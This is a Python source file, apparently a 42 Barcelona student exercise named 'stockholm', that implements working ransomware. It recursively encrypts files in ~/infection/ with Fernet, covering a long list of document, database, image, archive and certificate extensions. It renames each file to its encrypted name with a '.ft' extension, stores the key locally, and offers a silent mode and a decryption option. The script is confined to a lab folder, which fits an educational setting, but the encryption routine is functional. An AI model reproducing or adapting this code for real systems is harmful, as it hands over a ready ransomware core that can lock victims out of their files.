# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    stockholm.py                                       :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: amayo-ca <amayo-ca@student.42barc...>      +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2022/07/27 16:11:35 by amayo-ca          #+#    #+#              #
#    Updated: 2022/07/27 16:11:38 by amayo-ca         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

from fileinput import filename
import os
import argparse
import sys
import colorama
from colorama import Fore
from cryptography.fernet import Fernet


ext_to_encript = ['.der','.pfx','.crt','csr','p12','.pem','.odt','.ott','.sxw','.uot','.3ds','.max',
'.3dm','.ods','.ots','.sxc','.stc','.dif','.slk','.wb2','.odp','.otp','.sxd','.std','.uop','.odg','.otg','.sxm'     
,'.mml' ,'.lay','.lay6','.asc','.sqlite3','.sqlitedb','.sql','.accdb','.mdb','.db','.dbf','.odb','.frm','.myd'     
,'.myi','.ibd','.mdf','.ldf','.sln','.suo','.cs','.c','.cpp','.pas','.h','.asm','.js','.cmd','.bat','.ps1','.vbs'     
,'.vb','.pl','.dip','.dch','.sch','.brd','.jsp','.php','.asp','.rb','.java','.jar','.class','.sh','.mp3','.wav'     
,'.swf','.fla','.wmv','.mpg','.vob','.mpeg','.asf','.avi','.mov','.mp4','.3gp','.mkv','.3g2','.flv','.wma','.mid'     
,'.m3u','.m4u','.djvu','.svg','.ai','.psd','.nef','.tiff','.tif','.cgm','.raw','.gif','.png','.bmp','.jpg','.jpeg'   
,'.vcd','.iso','.backup','.zip','.rar','.7z','.gz','.tgz','.tar','.bak','.tbk','.bz2','.PAQ','.ARC','.aes','.gpg'
,'.vmx','.vmdk','.vdi','.sldm','.sldx','.sti','.sxi','.602','.hwp','.snt','.onetoc2','.dwg','.pdf','.wk1','.wks'
,'.123','.rtf','.csv','.txt','.vsdx','.vsd','.edb','.eml','.msg','.ost','.pst','.potm','.potx','.ppam','.ppsx'
,'.ppsm','.pps','.pot','.pptm','.pptx','.ppt','.xltm','.xltx','.xlc','.xlm','.xlt','.xlw','.xlsb','.xlsm'
,'.xlsx','.xls','.dotx','.dotm','.dot','.docm','.docb','.docx','.doc']


def banner():

	bcn ='''42Barcelona'''
	
	banner_tool = ''' _____  _                 _     _             _            
/  ___|| |               | |   | |           | |           
\ `--. | |_   ___    ___ | | __| |__    ___  | | _ __ ___  
 `--. \| __| / _ \  / __|| |/ /| '_ \  / _ \ | || '_ ` _ \ 
/\__/ /| |_ | (_) || (__ |   < | | | || (_) || || | | | | |
\____/  \__| \___/  \___||_|\_\|_| |_| \___/ |_||_| |_| |_|
'''
	by ='''                                                   by M4Y0  '''
	print("")
	print(Fore.MAGENTA + bcn)
	print(Fore.RED + banner_tool)
	print(Fore.CYAN + by)
	print(Fore.RESET)


files = []

infected_dir = os.environ["HOME"] + "/infection/"

if os.path.exists(infected_dir) == False:
	
	banner()
	print(Fore.RED + "The folder", infected_dir, end="")
	print(" does not exist")
	exit()

for file in os.listdir(infected_dir):

	if file == "ransomware.py" or file == "ransmkey.key":
		continue

	files.append(file)


def sub_encrypt(path, key, confirm):

	try:
		with open("ransmkey.key", "wb") as ransmkey:
			ransmkey.write(key)
	except:
		print(Fore.RED + "Key Error: Key not found")

	files = os.listdir(path)

	for file in files:
		file_name, file_ext = os.path.splitext(file)

		if os.path.isfile(path + '/' + file) and file_ext in ext_to_encript:

			file = path + '/' + file
			file_name = bytes(file, encoding = "utf-8")
			ext = bytes(".ft", encoding = "utf-8")
			
			try:
				with open(file, "rb") as clean_file:
					contents = clean_file.read()

				contents_encrypted = Fernet(key).encrypt(contents)
				title_encription = Fernet(key).encrypt(file_name)
				title_encrypted = infected_dir + title_encription.decode(encoding = 'utf-8') + ext.decode(encoding = 'utf-8')

				with open(file,"wb") as encrypting_file:
					encrypting_file.write(contents_encrypted)
					os.rename(file, title_encrypted)

				name_file(file, confirm, Fore.GREEN)
 
			except:
				name_file(file, confirm, Fore.RED)

		elif os.path.isfile(path + '/' + file) == False:
			file = path + '/' + file
			sub_encrypt(file, key, confirm)


def name_file(file_name, confirm, color):

	if confirm == "y":
		print(color + "[*] ", end="")
		print(Fore.RESET + file_name)
	else:
		return(0)


def decrypty(decrypt_key):

	if(decrypt_key == 1):
		try:
			with open("ransmkey.key", "rb") as key:
				decrypt_key = key.read()
		except:
			print(Fore.RED + "Key Error: The key file doesn't exist")

	for file in files:

		file_name, file_ext = os.path.splitext(file)
		file = infected_dir + file

		if file_ext == ".ft" and len(file_name) >= 100:
			try:
				decrypt_file(decrypt_key, file)
				decrypt_title(decrypt_key, file)
				name_file("✓", "y", Fore.GREEN)
			except:
			 	print(Fore.RED + "Decrypt fail in file: ", file)


def decrypt_file(decrypt_key, file):

	try:
		with open(file, "rb") as dirty_file:
			contents = dirty_file.read()

		contents_decrypted = Fernet(decrypt_key).decrypt(contents)

		with open(file, "wb") as decrypting_file:
			decrypting_file.write(contents_decrypted)
	except:
		print(Fore.RED + "Key Error: The key is not correct")


def decrypt_title(decrypt_key, file):

	file_name, file_ext = os.path.splitext(file)
	file_path, file_name = os.path.split(file_name)

	file_name_dec = bytes(file_name, encoding = "utf-8")
	title_decrypted = Fernet(decrypt_key).decrypt(file_name_dec)

	os.rename(file, title_decrypted)


def main():

	parser = argparse.ArgumentParser()

	parser.add_argument('-v', '--version', action='store_true', help='Show the version of the tool')
	parser.add_argument('-r', '--reverse', type=str, nargs=1, help='To decrypt with the given key')
	parser.add_argument('-s', '--silent', action='store_true', help="Don't show the name of the encripted files")

	args = parser.parse_args()

	if args.version:
		print(Fore.YELLOW + "Tool Version: 1.0v")
	elif args.reverse:
		decrypty(str(args.reverse))
	elif args.silent:
		key = Fernet.generate_key()
		sub_encrypt(infected_dir, key, "n")
	else:
		print("You want to encrypt (en) or decrypt (de):")
		answer = input()
		print("")
		if answer == "en":
			key = Fernet.generate_key()
			sub_encrypt(infected_dir, key, "y")
			
		elif answer == "de":
			decrypty(1)
		else:
			print(Fore.RED + "This is not a valid option")


if __name__ == '__main__':

	banner()
	main()
